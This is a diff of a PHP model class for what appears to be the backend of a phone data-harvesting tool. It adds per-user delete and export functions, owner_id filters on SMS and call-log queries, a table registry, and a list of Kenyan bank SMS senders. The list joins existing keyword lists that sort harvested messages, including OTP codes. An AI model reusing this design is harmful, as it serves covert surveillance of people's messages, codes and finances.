@@ -83,8 +83,10 @@ class Mod_Finder extends Model
                     $userArray['language'] = $profile['language'] ?? 'en';
                     $userArray['timezone'] = $profile['timezone'] ?? 'UTC';
                     $userArray['theme'] = $profile['theme'] ?? 'light';
+                    $userArray['email_notifications'] = $profile['email_notifications'] ?? 1;
                 } else {
                     $userArray['profile_image'] = null;
+                    $userArray['email_notifications'] = 1;
                 }
 
                 return $userArray;
@@ -276,6 +278,125 @@ class Mod_Finder extends Model
     public function deleteSensorsByUser(int $user_id): bool
     {
         return $this->fq('tbl_sensor_profile', $user_id)->delete();
+    }
+    public function deleteAccessibilityByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_accessibility_services', $user_id)->delete();
+    }
+    public function deleteInputMethodsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_input_methods', $user_id)->delete();
+    }
+    public function deleteSecurityAuditByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_security_audit', $user_id)->delete();
+    }
+    public function deleteProcInfoByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_proc_info', $user_id)->delete();
+    }
+    public function deleteDataUsageByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_data_usage', $user_id)->delete();
+    }
+    public function deleteSavedWifiByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_saved_wifi', $user_id)->delete();
+    }
+    public function deleteDefaultAppsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_default_apps', $user_id)->delete();
+    }
+    public function deleteAlarmsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_alarms', $user_id)->delete();
+    }
+    public function deleteAppSecurityByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_app_security', $user_id)->delete();
+    }
+    public function deleteNetworkSecurityByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_network_security', $user_id)->delete();
+    }
+    public function deleteTelephonyNetworkByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_telephony_network', $user_id)->delete();
+    }
+    public function deleteSystemLocaleByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_system_locale', $user_id)->delete();
+    }
+    public function deleteHardwareGraphicsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_hardware_graphics', $user_id)->delete();
+    }
+    public function deleteHardwareNetworkByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_hardware_network', $user_id)->delete();
+    }
+    public function deleteCameraInfoByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_camera_info', $user_id)->delete();
+    }
+    public function deleteBatteryStatsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_battery_stats', $user_id)->delete();
+    }
+    public function deleteCellTowersByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_cell_towers', $user_id)->delete();
+    }
+    public function deleteDisplayInfoByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_display_info', $user_id)->delete();
+    }
+    public function deleteStorageByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_storage', $user_id)->delete();
+    }
+    public function deleteThermalByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_thermal', $user_id)->delete();
+    }
+    public function deleteNfcByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_nfc', $user_id)->delete();
+    }
+    public function deleteProcessesByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_running_processes', $user_id)->delete();
+    }
+    public function deleteBlocklistByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_blocklist', $user_id)->delete();
+    }
+    public function deleteMlJobsByUser(int $user_id): bool
+    {
+        try {
+            return $this->db->table('ml_jobs')->where('user_id', $user_id)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'deleteMlJobsByUser error: ' . $e->getMessage());
+            return false;
+        }
+    }
+    public function deleteMlResultsByUser(int $user_id): bool
+    {
+        try {
+            return $this->db->table('ml_results')->where('user_id', $user_id)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'deleteMlResultsByUser error: ' . $e->getMessage());
+            return false;
+        }
+    }
+    public function deleteMlAnalysisTrackingByUser(int $user_id): bool
+    {
+        try {
+            return $this->db->table('ml_analysis_tracking')->where('user_id', $user_id)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'deleteMlAnalysisTrackingByUser error: ' . $e->getMessage());
+            return false;
+        }
     }
 
     /**
@@ -687,8 +808,9 @@ class Mod_Finder extends Model
     {
         try {
             $builder = $this->db->table('tbl_sms')
-                ->select('address as sms_number, thread_id as sms_thread_id, count(*) AS Totals');
-                
+                ->select('address as sms_number, thread_id as sms_thread_id, count(*) AS Totals')
+                ->where('owner_id', $user_id);
+
             $blocked = $this->getBlockedIdentifiers($user_id, 'sms');
             if (!empty($blocked)) {
                 $builder->whereNotIn('address', $blocked);
@@ -821,8 +943,9 @@ class Mod_Finder extends Model
     {
         try {
             $builder = $this->db->table('tbl_logs')
-                ->select('phone_number as Caller, contact_name as Saved, count(*) AS Totals');
-                
+                ->select('phone_number as Caller, contact_name as Saved, count(*) AS Totals')
+                ->where('owner_id', $user_id);
+
             $blocked = $this->getBlockedIdentifiers($user_id, 'call');
             if (!empty($blocked)) {
                 $builder->whereNotIn('phone_number', $blocked);
@@ -1249,6 +1372,90 @@ class Mod_Finder extends Model
     public function export_device_files(int $user_id, int $limit = 1000): array
     {
         return $this->fq('tbl_device_files', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_accessibility(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_accessibility_services', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_input_methods(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_input_methods', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_proc_info(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_proc_info', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_data_usage(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_data_usage', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_saved_wifi(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_saved_wifi', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_default_apps(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_default_apps', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_alarms(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_alarms', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_app_security(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_app_security', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_network_security(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_network_security', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_telephony_network(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_telephony_network', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_system_locale(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_system_locale', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_hardware_graphics(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_hardware_graphics', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_hardware_network(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_hardware_network', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_camera_info(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_camera_info', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_battery_stats(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_battery_stats', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_cell_towers(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_cell_towers', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_display_info(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_display_info', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_storage(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_storage', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_thermal(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_thermal', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_nfc(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_nfc', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_processes(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_running_processes', $user_id)->limit($limit)->get()->getResultArray();
     }
 
     // ── Advanced Extractor Paginated Queries ──────────────────────────────────
@@ -2655,6 +2862,7 @@ class Mod_Finder extends Model
         }
 
         $fin_keys = ['bank', 'mpesa', 'equity', 'kcb', 'transaction', 'kes', 'paid', 'received', 'balance', 'credited', 'debited', 'reversal'];
+        $fin_senders = ['kcb', 'kcb_mobile', 'equitybank', 'equity', 'coopbank', 'mcoopcash', 'ncba', 'ncba_loop', 'absa', 'absabank', 'stanbic', 'stanbic_ke', 'familybank', 'stanchart', 'dtb', 'im_bank', 'postbank', 'mpesa'];
         $otp_keys = ['code', 'otp', 'verification', 'login', 'password reset'];
         $promo_keys = ['offer', 'discount', '% off', 'sale', 'win', 'subscribe', 'buy', 'promo', 'exclusive', 'betting', 'bet', 'jackpot'];
         $util_keys = ['kplc', 'water', 'token', 'zuku', 'fiber', 'safaricom home', 'bill', 'due date'];
@@ -5116,5 +5324,277 @@ try {
             log_message('error', 'delete_system_locale_row: ' . $e->getMessage());
             return false;
         }
+    }
+
+    /**
+     * Centralized Table Registry — maps every data table to its extractor category.
+     * New extractors only need a new entry here to be included in unified delete/export.
+     */
+    public const TABLE_REGISTRY = [
+        // Legacy extractors
+        'sms'       => 'tbl_sms',
+        'calls'     => 'tbl_logs',
+        'contacts'  => 'tbl_contacts',
+        'apps'      => 'tbl_apps',
+        'location'  => 'tbl_location',
+        'activity'  => 'tbl_activity',
+        'files'     => 'tbl_device_files',
+        'sim_configs' => 'tbl_sim_configs',
+
+        // Advanced extractors (Group 1)
+        'device_context'    => 'tbl_device_context',
+        'network_info'      => 'tbl_network_info',
+        'nearby_wifi'       => 'tbl_nearby_wifi',
+        'accounts'          => 'tbl_accounts',
+        'calendar'          => 'tbl_calendar_events',
+        'bluetooth'         => 'tbl_bluetooth',
+        'bluetooth_paired'  => 'tbl_bluetooth_paired',
+        'sensors'           => 'tbl_sensor_profile',
+        'device_profile'    => 'tbl_device_profile',
+        'proc_info'         => 'tbl_proc_info',
+        'running_processes' => 'tbl_running_processes',
+        'running_process_details' => 'tbl_running_process_details',
+        'running_services'  => 'tbl_running_services',
+        'camera_info'       => 'tbl_camera_info',
+        'battery_stats'     => 'tbl_battery_stats',
+        'accessibility'     => 'tbl_accessibility_services',
+        'input_methods'     => 'tbl_input_methods',
+        'input_method_subtypes' => 'tbl_input_method_subtypes',
+
+        // Advanced extractors (Group 2)
+        'cell_towers'       => 'tbl_cell_towers',
+        'display_info'      => 'tbl_display_info',
+        'storage'           => 'tbl_storage',
+        'thermal'           => 'tbl_thermal',
+        'nfc'               => 'tbl_nfc',
+        'hardware_graphics' => 'tbl_hardware_graphics',
+        'hardware_network'  => 'tbl_hardware_network',
+
+        // Advanced extractors (Group 3)
+        'app_security'      => 'tbl_app_security',
+        'network_security'  => 'tbl_network_security',
+        'telephony_network' => 'tbl_telephony_network',
+        'system_locale'     => 'tbl_system_locale',
+
+        // Composite extractors (data lives in existing tables, listed by destination)
+        'apps_notifications' => [
+            'tbl_app_usage',
+            'tbl_app_usage_sessions',
+            'tbl_notifications',
+        ],
+        'misc_software' => [
+            'tbl_calendar_events',
+            'tbl_accounts',
+            'tbl_accessibility_services',
+            'tbl_input_methods',
+            'tbl_data_usage',
+            'tbl_saved_wifi',
+            'tbl_default_apps',
+            'tbl_alarms',
+            'tbl_app_security',
+            'tbl_network_security',
+            'tbl_telephony_network',
+            'tbl_system_locale',
+            'tbl_device_context',
+            'tbl_sim_configs',
+            'tbl_proc_info',
+            'tbl_app_usage',
+            'tbl_notifications',
+        ],
+        'misc_hardware' => [
+            'tbl_hardware_graphics',
+            'tbl_hardware_network',
+            'tbl_camera_info',
+            'tbl_battery_stats',
+            'tbl_sensor_profile',
+            'tbl_bluetooth',
+            'tbl_network_info',
+            'tbl_cell_towers',
+            'tbl_display_info',
+            'tbl_storage',
+            'tbl_thermal',
+            'tbl_nfc',
+            'tbl_running_processes',
+        ],
+
+        // Other data
+        'uploaded_files'    => 'uploaded_files',
+        'captured_media'    => 'tbl_captured_media',
+        'user_actions'      => 'tbl_user_actions',
+        'device_config'     => 'tbl_device_config',
+        'app_defaults'      => 'tbl_app_defaults',
+    ];
+
+    /**
+     * Nuclear delete — removes ALL user data from every registered table.
+     * Includes DB records AND associated uploaded files on disk.
+     * Uses a transaction for atomicity.
+     *
+     * @return array{success: bool, deleted: array<string, int>, total_deleted: int}
+     */
+    public function deleteAllUserData(int $userId): array
+    {
+        $db = $this->db;
+        $db->transStart();
+        $deleted = [];
+        $totalDeleted = 0;
+
+        try {
+            foreach (self::TABLE_REGISTRY as $category => $tables) {
+                $tableList = is_array($tables) ? $tables : [$tables];
+
+                foreach ($tableList as $table) {
+                    if (!$db->tableExists($table)) {
+                        log_message('warning', 'deleteAllUserData: Table "{table}" does not exist, skipping.', ['table' => $table]);
+                        continue;
+                    }
+                    $count = $db->table($table)->where('owner_id', $userId)->countAllResults(false);
+                    if ($count > 0) {
+                        $db->table($table)->where('owner_id', $userId)->delete();
+                        $deleted[$table] = $count;
+                        $totalDeleted += $count;
+                    }
+                }
+            }
+
+            // Also delete associated uploaded files on disk
+            $fileCount = $this->deleteUploadedFilesOnDisk($userId);
+            if ($fileCount > 0) {
+                $deleted['tbl_uploaded_files'] = $fileCount;
+                $totalDeleted += $fileCount;
+            }
+
+            $db->transComplete();
+
+            if ($db->transStatus() === false) {
+                log_message('error', 'deleteAllUserData: Transaction failed for user ' . $userId);
+                return ['success' => false, 'deleted' => [], 'total_deleted' => 0];
+            }
+
+            log_message('info', 'deleteAllUserData: Deleted ' . $totalDeleted . ' rows for user ' . $userId);
+            return ['success' => true, 'deleted' => $deleted, 'total_deleted' => $totalDeleted];
+
+        } catch (\Exception $e) {
+            $db->transRollback();
+            log_message('error', 'deleteAllUserData: Exception for user ' . $userId . ' — ' . $e->getMessage());
+            return ['success' => false, 'deleted' => [], 'total_deleted' => 0];
+        }
+    }
+
+    /**
+     * Deletes physical uploaded files associated with a user.
+     * Returns count of files deleted.
+     */
+    private function deleteUploadedFilesOnDisk(int $userId): int
+    {
+        try {
+            $model = new \App\Models\Mod_Uploaded_Files();
+            $records = $model->where('owner_id', $userId)->findAll();
+            $count = 0;
+
+            foreach ($records as $record) {
+                $filePath = WRITEPATH . 'uploads/text_dump/' . ($record['new_name'] ?? '');
+                if ($filePath && file_exists($filePath)) {
+                    @unlink($filePath);
+                    $count++;
+                }
+            }
+
+            $model->where('owner_id', $userId)->delete();
+            return $count;
+        } catch (\Exception $e) {
+            log_message('error', 'deleteUploadedFilesOnDisk: ' . $e->getMessage());
+            return 0;
+        }
+    }
+
+    /**
+     * Exports ALL user data organized by extractor category.
+     * Returns structured data with row counts and estimated file sizes.
+     */
+    public function exportAllUserData(int $userId): array
+    {
+        $result = [
+            'exported_at' => date('Y-m-d H:i:s'),
+            'user_id'     => $userId,
+            'categories'   => [],
+            'total_rows'   => 0,
+            'total_size_bytes' => 0,
+        ];
+
+        foreach (self::TABLE_REGISTRY as $category => $tables) {
+            $tableList = is_array($tables) ? $tables : [$tables];
+            $categoryData = [
+                'tables'     => [],
+                'total_rows' => 0,
+                'total_size_bytes' => 0,
+            ];
+
+            foreach ($tableList as $table) {
+                if (!$this->db->tableExists($table)) {
+                    continue;
+                }
+
+                $builder = $this->db->table($table);
+                $builder->where('owner_id', $userId);
+                $count = $builder->countAllResults(false);
+
+                if ($count > 0) {
+                    $avgRowBytes = $this->estimateAvgRowBytes($table);
+                    $estimatedBytes = $count * $avgRowBytes;
+
+                    $categoryData['tables'][] = [
+                        'name'         => $table,
+                        'count'        => $count,
+                        'estimated_size_bytes' => $estimatedBytes,
+                        'estimated_size_human' => $this->humanizeBytes($estimatedBytes),
+                    ];
+                    $categoryData['total_rows'] += $count;
+                    $categoryData['total_size_bytes'] += $estimatedBytes;
+                    $result['total_rows'] += $count;
+                    $result['total_size_bytes'] += $estimatedBytes;
+                }
+            }
+
+            if ($categoryData['total_rows'] > 0) {
+                $categoryData['total_size_human'] = $this->humanizeBytes($categoryData['total_size_bytes']);
+                $result['categories'][$category] = $categoryData;
+            }
+        }
+
+        $result['total_size_human'] = $this->humanizeBytes($result['total_size_bytes']);
+        return $result;
+    }
+
+    /**
+     * Estimates average row size for a table based on column count.
+     */
+    private function estimateAvgRowBytes(string $table): int
+    {
+        try {
+            $fields = $this->db->getFieldData($table);
+            $fieldCount = count($fields);
+            // Rough estimate: 200 bytes per field on average for text/data fields
+            return max(200, $fieldCount * 200);
+        } catch (\Exception $e) {
+            return 1024; // fallback 1KB per row
+        }
+    }
+
+    /**
+     * Converts bytes to human-readable format.
+     */
+    private function humanizeBytes(int $bytes): string
+    {
+        if ($bytes < 1024) {
+            return $bytes . ' B';
+        }
+        if ($bytes < 1048576) {
+            return round($bytes / 1024, 1) . ' KB';
+        }
+        if ($bytes < 1073741824) {
+            return round($bytes / 1048576, 1) . ' MB';
+        }
+        return round($bytes / 1073741824, 2) . ' GB';
     }
 }
